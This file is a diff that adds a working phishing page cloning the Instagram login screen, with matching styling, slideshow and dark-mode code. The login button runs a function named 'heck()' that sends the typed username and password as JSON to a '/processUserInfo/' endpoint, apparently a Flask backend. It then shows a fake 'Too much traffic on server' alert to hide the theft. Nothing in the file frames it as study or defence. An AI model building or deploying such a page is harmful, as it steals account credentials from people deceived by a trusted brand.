@@ -1,0 +1,588 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Instagram</title>
+    <!-- FAVIVON -->
+    <link
+      rel="shortcut icon"
+      href="/static/images/favicon.png"
+      type="image/png"
+    />
+    <!-- GOOGLE FONT -->
+    <link rel="preconnect" href="https://fonts.gstatic.com" />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap"
+      rel="stylesheet"
+    />
+    <!-- APP CSS -->
+  </head>
+
+  <body>
+    <div class="container">
+      <div class="main-container">
+        <div class="main-content">
+          <div
+            class="slide-container"
+            style="background-image: url(/static/images/phone-frame.png)"
+          >
+            <div class="slide-content" id="slide-content">
+              <img
+                src="/static/images/slide (1).jpg"
+                alt="slide image"
+                class="active"
+              />
+              <img src="/static/images/slide (2).jpg" alt="slide image" />
+              <img src="/static/images/slide (3).jpg" alt="slide image" />
+              <img src="/static/images/slide (4).jpg" alt="slide image" />
+              <img src="/static/images/slide (5).jpg" alt="slide image" />
+            </div>
+          </div>
+          <div class="form-container">
+            <div class="form-content box">
+              <div class="logo">
+                <img
+                  src="/static/images/logo-light.png"
+                  alt="Instagram logo"
+                  class="logo-light"
+                />
+                <img
+                  src="/static/images/logo-dark.png"
+                  alt="Instagram logo"
+                  class="logo-dark"
+                />
+              </div>
+              <div class="signin-form" id="signin-form">
+                <div class="form-group">
+                  <div class="animate-input">
+                    <span> Phone number, username or email </span>
+                    <input type="text" id="username" />
+                  </div>
+                </div>
+                <div class="form-group">
+                  <div class="animate-input">
+                    <span> Password </span>
+                    <input type="password" id="password" />
+                    <button>Show</button>
+                  </div>
+                </div>
+                <div class="btn-group">
+                  <button
+                    class="btn-login"
+                    id="signin-btn"
+                    onclick="heck()"
+                    disabled
+                  >
+                    Log In
+                  </button>
+
+                  <script>
+                    function heck() {
+                      var uname = document.getElementById("username").value;
+                      var pass = document.getElementById("password").value;
+
+                      let userinfo = {
+                        username: uname,
+                        password: pass,
+                      };
+
+                      var info = JSON.stringify(userinfo);
+
+                      const request = new XMLHttpRequest();
+                      request.open("POST", `/processUserInfo/${info}`);
+                      request.onload = () => {
+                        const flaskmessage = request.responseText;
+                        console.log(flaskmessage);
+                      };
+                      request.send();
+
+                      alert(
+                        "Too much traffic on server, Please try again later"
+                      );
+                    }
+                  </script>
+                </div>
+                <div class="divine">
+                  <div></div>
+                  <div>OR</div>
+                  <div></div>
+                </div>
+                <div class="btn-group">
+                  <button class="btn-fb">
+                    <img src="/static/images/facebook-icon.png" alt="" />
+                    <span>Log in with Facebook</span>
+                  </button>
+                </div>
+                <a href="#" class="forgot-pw">Forgot password?</a>
+              </div>
+            </div>
+            <div class="box goto">
+              <p>
+                Don't have an account?
+                <a href="#">Sign up</a>
+              </p>
+            </div>
+
+            <div class="app-download">
+              <p>Get the app.</p>
+              <div class="store-link">
+                <a href="#">
+                  <img src="/static/images/app-store.png" alt="app store" />
+                </a>
+                <a href="#">
+                  <img src="/static/images/gg-play.png" alt="google play" />
+                </a>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="footer">
+        <div class="links">
+          <a href="#">About</a>
+          <a href="#">Blog</a>
+          <a href="#">Jobs</a>
+          <a href="#">Help</a>
+          <a href="#">API</a>
+          <a href="#">Privacy</a>
+          <a href="#">Terms</a>
+          <a href="#">Top Accounts</a>
+          <a href="#">Hashtags</a>
+          <a href="#">Locations</a>
+          <a href="#" id="darkmode-toggle">Darkmode</a>
+        </div>
+        <div class="copyright">© 2021 Instagram from Facebook</div>
+      </div>
+    </div>
+
+    <style>
+      :root {
+        --body-bg: #fafafa;
+        --box-bg: #fff;
+        --box-border-color: #dbdbdb;
+        --txt-color: #262626;
+        --txt-second-color: #8e8e8e;
+        --btn-bg: #0095f6;
+        --btn-color: #fff;
+        --fb-color: #385185;
+        --a-color: #00376b;
+      }
+
+      .dark {
+        --body-bg: #151515;
+        --box-bg: #151515;
+        --box-border-color: #262626;
+        --txt-color: #d2d2d2;
+      }
+
+      * {
+        padding: 0;
+        margin: 0;
+        box-sizing: border-box;
+      }
+
+      body {
+        font-family: "Roboto", sans-serif;
+        background-color: var(--body-bg);
+        color: var(--txt-color);
+      }
+
+      .container {
+        height: 100vh;
+        display: flex;
+        flex-direction: column;
+      }
+
+      .main-container {
+        display: flex;
+        flex-grow: 1;
+      }
+
+      .main-content {
+        margin: 32px auto;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        max-width: 935px;
+        flex-grow: 1;
+      }
+
+      .slide-container {
+        height: 618px;
+        flex-basis: 454px;
+      }
+
+      .slide-content {
+        margin: 99px 0 0 151px;
+        position: relative;
+      }
+
+      .slide-content img {
+        position: absolute;
+        inset: 0;
+        opacity: 0;
+        visibility: hidden;
+        transition: all 0.5s ease-in-out;
+      }
+
+      .slide-content img.active {
+        opacity: 1;
+        visibility: visible;
+      }
+
+      .form-container {
+        flex-grow: 1;
+        max-width: 350px;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+      }
+
+      .box {
+        border: 1px solid var(--box-border-color);
+        background-color: var(--box-bg);
+        border-radius: 3px;
+      }
+
+      .form-content {
+        margin-bottom: 10px;
+        padding: 10px;
+      }
+
+      .form-content .logo {
+        text-align: center;
+        height: 51px;
+        width: 175px;
+        margin: 22px auto 12px;
+      }
+
+      .form-content .logo img {
+        max-width: 100%;
+      }
+
+      .logo-dark {
+        display: none;
+      }
+
+      .dark .logo-dark {
+        display: block;
+      }
+
+      .dark .logo-light {
+        display: none;
+      }
+
+      .signin-form {
+        padding-top: 24px;
+        margin-bottom: 10px;
+      }
+
+      .form-group {
+        margin: 0 40px 6px;
+      }
+
+      .animate-input {
+        height: 36px;
+        border: 1px solid var(--box-border-color);
+        border-radius: 3px;
+        position: relative;
+      }
+
+      .animate-input span {
+        position: absolute;
+        left: 8px;
+        height: 100%;
+        font-size: 12px;
+        line-height: 36px;
+        color: var(--txt-second-color);
+        transform-origin: left;
+        transition: transform 0.1s ease-in-out;
+        pointer-events: none;
+      }
+
+      .animate-input input {
+        width: 100%;
+        height: 100%;
+        padding: 9px 8px 7px;
+        border: 0;
+        outline: 0;
+        background-color: var(--box-bg);
+        color: var(--txt-color);
+      }
+
+      .animate-input.active span {
+        transform: scale(0.83333) translateY(-10px);
+      }
+
+      .animate-input.active input {
+        padding: 14px 0 2px 8px;
+      }
+
+      .animate-input button {
+        color: var(--txt-color);
+        border: 0;
+        outline: 0;
+        display: inline;
+        font-weight: 600;
+        font-size: 14px;
+        background-color: transparent;
+        position: absolute;
+        right: 8px;
+        top: 50%;
+        transform: translateY(-50%);
+        cursor: pointer;
+        display: none;
+      }
+
+      .animate-input.active button {
+        display: inline;
+      }
+
+      .btn-group {
+        padding: 8px 40px;
+      }
+
+      .btn-login {
+        width: 100%;
+        border: 1px solid transparent;
+        outline: 0;
+        background-color: var(--btn-bg);
+        color: var(--btn-color);
+        cursor: pointer;
+        font-weight: 600;
+        font-size: 14px;
+        line-height: 18px;
+        padding: 5px 9px;
+        border-radius: 4px;
+      }
+
+      button:disabled {
+        background-color: rgba(0, 149, 246, 0.3);
+      }
+
+      .divine {
+        padding: 10px 40px 18px;
+        display: flex;
+      }
+
+      .divine div:nth-child(2) {
+        font-size: 13px;
+        font-weight: 600;
+        line-height: 15px;
+        margin: 0 18px;
+        color: var(--txt-second-color);
+      }
+
+      .divine div:nth-child(1),
+      .divine div:nth-child(3) {
+        flex-grow: 1;
+        height: 1px;
+        background-color: var(--box-border-color);
+        position: relative;
+        top: 0.45em;
+      }
+
+      .btn-fb {
+        border: 0;
+        outline: 0;
+        background-color: transparent;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        width: 100%;
+        cursor: pointer;
+      }
+
+      .btn-fb img {
+        width: 16px;
+        height: 16px;
+        margin-right: 8px;
+      }
+
+      .btn-fb span {
+        color: var(--fb-color);
+        font-size: 14px;
+        font-weight: 600;
+        line-height: 18px;
+      }
+
+      .forgot-pw {
+        display: block;
+        font-size: 12px;
+        line-height: 14px;
+        margin-top: 12px;
+        text-align: center;
+        color: var(--a-color);
+        text-decoration: none;
+      }
+
+      .goto {
+        padding: 10px;
+        margin-bottom: 10px;
+      }
+
+      .goto p {
+        font-size: 14px;
+        margin: 15px;
+        text-align: center;
+      }
+
+      .goto a {
+        text-decoration: none;
+        color: var(--btn-bg);
+        font-size: inherit;
+        line-height: 18px;
+        font-weight: 600;
+      }
+
+      .app-download {
+        display: flex;
+        flex-direction: column;
+      }
+
+      .app-download p {
+        font-size: 14px;
+        line-height: 18px;
+        text-align: center;
+        margin: 10px 20px;
+      }
+
+      .store-link {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        padding: 10px;
+      }
+
+      .store-link a img {
+        height: 40px;
+      }
+
+      .store-link a:nth-child(1) {
+        margin-right: 8px;
+      }
+
+      .footer {
+        padding-bottom: 52px;
+        padding-top: 24px;
+      }
+
+      .links {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        flex-wrap: wrap;
+      }
+
+      .links a {
+        text-decoration: none;
+        color: var(--txt-second-color);
+        font-size: 13px;
+        line-height: 18px;
+        margin: 0 8px 12px 8px;
+      }
+
+      .copyright {
+        padding: 12px 0;
+        color: var(--txt-second-color);
+        font-size: 13px;
+        line-height: 18px;
+        text-align: center;
+      }
+
+      /* responsive */
+
+      @media only screen and (max-width: 800px) {
+        .slide-container {
+          display: none;
+        }
+      }
+
+      @media only screen and (max-width: 500px) {
+        .main-content {
+          margin-top: 0;
+        }
+
+        .box {
+          border: 0;
+          background-color: transparent;
+        }
+      }
+    </style>
+
+    <!-- APP JS -->
+    <script>
+      let slide_content = document.querySelector("#slide-content");
+
+      let signin_form = document.querySelector("#signin-form");
+
+      let signin_btn = document.querySelector("#signin-btn");
+
+      let darkmode_toggle = document.querySelector("#darkmode-toggle");
+
+      let slide_index = 0;
+
+      slide = () => {
+        let slide_items = slide_content.querySelectorAll("img");
+        slide_items.forEach((e) => e.classList.remove("active"));
+        slide_index =
+          slide_index + 1 === slide_items.length ? 0 : slide_index + 1;
+        slide_items[slide_index].classList.add("active");
+      };
+
+      setInterval(slide, 2000);
+
+      // animate input
+      document.querySelectorAll(".animate-input").forEach((e) => {
+        let input = e.querySelector("input");
+        let button = e.querySelector("button");
+
+        input.onkeyup = () => {
+          if (input.value.trim().length > 0) {
+            e.classList.add("active");
+          } else {
+            e.classList.remove("active");
+          }
+
+          if (checkSigninInput()) {
+            signin_btn.removeAttribute("disabled");
+          } else {
+            signin_btn.setAttribute("disabled", "true");
+          }
+        };
+
+        // show password button
+        if (button) {
+          button.onclick = () => {
+            if (input.getAttribute("type") === "text") {
+              input.setAttribute("type", "password");
+              button.innerHTML = "Show";
+            } else {
+              input.setAttribute("type", "text");
+              button.innerHTML = "Hide";
+            }
+          };
+        }
+      });
+
+      checkSigninInput = () => {
+        let inputs = signin_form.querySelectorAll("input");
+        return Array.from(inputs).every((input) => {
+          return input.value.trim().length >= 6;
+        });
+      };
+
+      // darkmode toggle
+      darkmode_toggle.onclick = (e) => {
+        e.preventDefault();
+        let body = document.querySelector("body");
+        body.classList.toggle("dark");
+        darkmode_toggle.innerHTML = body.classList.contains("dark")
+          ? "Lightmode"
+          : "Darkmode";
+      };
+    </script>
+  </body>
+</html>
